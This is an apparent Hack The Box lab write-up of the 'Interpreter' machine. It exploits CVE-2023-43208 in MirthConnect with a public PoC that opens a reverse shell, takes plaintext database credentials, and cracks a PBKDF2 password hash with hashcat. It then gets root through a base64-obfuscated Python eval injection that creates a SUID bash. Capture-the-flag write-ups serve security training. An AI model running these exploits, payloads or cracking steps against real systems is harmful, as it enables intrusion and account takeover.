
# HTB — Interpreter Writeup
[Here are the notes I took while solving](./Walkthrough)

> **Difficulty:** Medium | **OS:** Linux | **Rating:** 2.5/5 ⭐

---

![Homepage](sc/homepage.jpg)

---

## First Impressions

That 2.5/5 rating genuinely scared me a little. In my experience, boxes with low ratings tend to be either surprisingly easy or just... weird. Let's find out.

---

## Recon

Starting with a classic nmap scan:

```bash
nmap -p- -sV 10.129.4.233
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp   open  http     Jetty
443/tcp  open  ssl/http Jetty
6661/tcp open  unknown
```

HTTP/HTTPS on Jetty, SSH, and a mysterious port 6661. The web server is running Jetty, which is a classic Java thing — smells like **MirthConnect** already.

---

## Foothold — CVE-2023-43208

Browsing to the site, I land on a **MirthConnect** login page styled like a hospital portal. No version number visible, just "2021" in the footer. That's enough to go on.

A quick search and **CVE-2023-43208** comes up basically everywhere. It's old but well-known, and if they're showing "2021" on the page, it fits perfectly.

I grabbed [this POC](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT) and after some minor pain getting Python 3.10 and the dependencies installed, I ran it:

```bash
python3.10 ./CVE-2023-43208.py -u https://10.129.4.233 -lh 10.10.14.226 -lp 9333
```

It worked. Shell as `mirth`.

---

## Lateral Movement — mirth → sedric

Inside the MirthConnect install directory I peeked at the config:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

```
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

Nice. Into the database:

```sql
SELECT * FROM PERSON_PASSWORD;
```

```
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
```

A hash. I checked the MirthConnect source to understand the format:

[Digester.java on GitHub](https://github.com/nextgenhealthcare/connect/blob/4.4.x/server/src/com/mirth/commons/encryption/Digester.java)

Key findings:
- Algorithm: `PBKDF2WithHmacSHA256`
- Salt size: **8 bytes**, prepended to the hash
- Iterations: **600,000**

Version confirmed:
```bash
cat /usr/local/mirthconnect/preferences
# install4j response file for Mirth Connect 4.4.0.b2948
```

Hashcat mode `10900` handles `PBKDF2-HMAC-SHA256` with the format:
```
sha256:iterations:salt_b64:hash_b64
```

I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false,false)Take_bytes(0,8,false)To_Base64('A-Za-z0-9%2B/%3D')&input=dS8rTEJCT1VuYWRpeUZCc01Pb0lEUExiVVIwcms1OWtFa1BVMTdpdGRyVldBL2tMTXQzdyt3PT0&oeol=VT) to decode the base64, split the first 8 bytes as salt and the rest as the actual digest, then re-encode both in base64 separately:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

I won't lie, I spent a while getting the formatting right. But once it clicked:

```bash
echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash
hashcat -m 10900 -a 0 hash /usr/share/wordlists/rockyou.txt
```

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```

`sedric:snowflake1` → SSH in, user flag grabbed.

---

## Privilege Escalation — The Dangerous eval

After landing as `sedric` and noting that `sudo` isn't installed, I scanned the active ports:

```
tcp   LISTEN 0   128   127.0.0.1:54321   0.0.0.0:*
```

Something is listening locally on port 54321. I found the culprit:

```bash
cat /usr/local/bin/notif.py
```

This is a Flask API running as root, accepting XML patient data and writing notification files to `/var/secure-health/patients/`. The interesting part that immediately jumped out at me:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
try:
    return eval(f"f'''{template}'''")
```

An `eval` on a user-controlled f-string. That's... spicy. Let me check the input validation:

```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```

So it accepts: alphanumerics, `_`, `'`, `"`, `(`, `)`, `{`, `}`, `=`, `+`, `/`. Looking at that pattern, my first test payload:

```python
{__import__('os').system('id')}
```

Every character in there matches the regex. I verified this locally with a quick script — **it passes the filter and executes**. 

The only annoying constraint is **no spaces**. That rules out a lot of bash commands directly. But wait — I can base64-encode my command and decode it at runtime! `base64.b64decode()` uses only alphanumerics, `+`, `/`, and `=`. Every single one of those is in the allowed charset.

Target payload: `cp /bin/bash /tmp/bash; chmod +s /tmp/bash;`

Encoded:
```
Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw==
```

Final injection:

```python
{__import__('os').system(__import__('base64').b64decode('Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='))}
```

I reproduced the XML server locally to test the full request format first (`scripts/script.py`), then fired it at the real target using `wget` (no `curl` available on the box):

```bash
wget -S -O - \
  --post-data='<patient>
  <firstname>{__import__('\''os'\'').system(__import__('\''base64'\'').b64decode('\''Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='\''))}</firstname>
  <lastname>a</lastname>
  <sender_app>a</sender_app>
  <timestamp>a</timestamp>
  <birth_date>12/12/1901</birth_date>
  <gender>a</gender>
</patient>' \
  --header='Content-Type: application/xml' \
  http://127.0.0.1:54321/addPatient
```

```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
```

Checking `/tmp`:

```bash
ls -la /tmp
-rwsr-sr-x  1 root   root   1265648 Feb 24 09:50 bash
```

SUID bash. Let's go:

```bash
/tmp/bash -p
```

Root flag found in `/root`. Done.

---

## Conclusions

Maybe the low rating wasn't for the difficuty but the easyness. The CVE was well-documented and trivial to exploit, the database credentials were sitting right there in plaintext, the hash format was just a matter of reading the source code carefully, and the `eval` injection had filters that were way too permissive to actually stop anything. The base64 trick to bypass the space restriction was probably the most "creative" step in the whole chain, and even that took maybe five minutes.

It was a fun box and a smooth experience, but I'd agree with the community — for a "Medium", this felt more like an Easy
